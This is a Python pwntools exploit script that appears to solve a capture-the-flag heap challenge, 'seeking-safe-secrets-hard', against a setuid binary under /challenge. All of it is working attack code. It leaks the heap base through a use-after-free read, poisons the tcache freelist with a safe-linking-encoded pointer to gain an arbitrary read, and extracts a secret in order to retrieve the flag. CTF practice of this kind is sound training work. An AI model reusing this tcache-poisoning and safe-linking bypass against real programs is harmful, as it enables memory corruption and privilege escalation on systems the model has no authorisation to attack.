import sys
import pwn

pwn.context.update(arch="amd64", os="linux", terminal=["tmux", "new-window"])


def tee[T: pwn.tube](process: T) -> T:
    orig_recv_raw = process.recv_raw
    output = sys.__stdout__.buffer  # type: ignore sys.stdout is replaced by pwn.term

    def recv_raw(numb, *args, **kwargs):
        data = orig_recv_raw(numb, *args, **kwargs) or b""  # orig may return str('')
        output.write(data)
        output.flush()
        return data

    process.recv_raw = recv_raw
    return process


def find_challenge(search_path="/challenge"):
    from pathlib import Path
    import os
    import stat

    xs = [
        str(f.absolute())
        for f in Path(search_path).iterdir()
        if f.is_file()
        and not f.name.startswith(".")
        and os.access(f, os.X_OK)
        and (f.stat().st_mode & stat.S_ISUID)
    ]
    if not xs:
        raise FileNotFoundError(f"No executable found in {search_path}")
    if len(xs) > 1:
        raise FileNotFoundError(f"Multiple executables found in {search_path}")
    return xs[0]


def one_round(io: pwn.process):
    tee(io)

    if io.recvuntil(b"stored at ", timeout=1):
        secret_addr = int(io.recvuntil(b".", True), 16)
        pwn.success(f"secret_addr: {hex(secret_addr)}")
    else:
        secret_addr = 0x425F60  # seeking-safe-secrets-hard

    def read_byte(idx):
        io.sendline(b"puts %d" % idx)
        io.recvuntil(b"Data: ")
        return pwn.u64(io.recvline(False).ljust(8, b"\x00")[:8])

    def scanf(idx, data):
        io.sendline(b"scanf %d" % idx)
        io.sendline(data)

    def protect_ptr(pos: int, ptr: int) -> int:
        return (pos >> 12) ^ ptr

    def reveal_ptr(pos: int, ptr: int) -> int:
        return protect_ptr(pos, ptr)

    io.sendline(b"malloc 0 16")
    io.sendline(b"free 0")
    heap = read_byte(0) << 12  # page aligned
    io.sendline(b"malloc 0 16")
    io.sendline(b"malloc 1 16")
    io.sendline(b"free 1")
    io.sendline(b"free 0")
    scanf(0, pwn.p64(protect_ptr(heap, secret_addr)))  # 把要访问的地址编码后写入
    io.sendline(b"malloc 0 16")
    io.sendline(b"malloc 1 16")
    io.sendline(b"free 0")

    secret1 = reveal_ptr(heap, read_byte(0))  # 是个 heap 上的地址
    secret1 = reveal_ptr(secret_addr, secret1)  # 是个 bss 上的地址
    secret1 = pwn.p64(secret1)
    secret2 = pwn.p64(0)  # key will be zeroed

    io.sendline(b"send_flag")
    io.sendline(secret1 + secret2)
    io.sendline(b"quit")


def ctf():
    root_bin = find_challenge()
    with pwn.process(root_bin, raw=True, level="error") as io:
        try:
            one_round(io)
            io.recvrepeat()
        except Exception:
            io.recvrepeat(0.5)
            raise


if __name__ == "__main__":
    ctf()
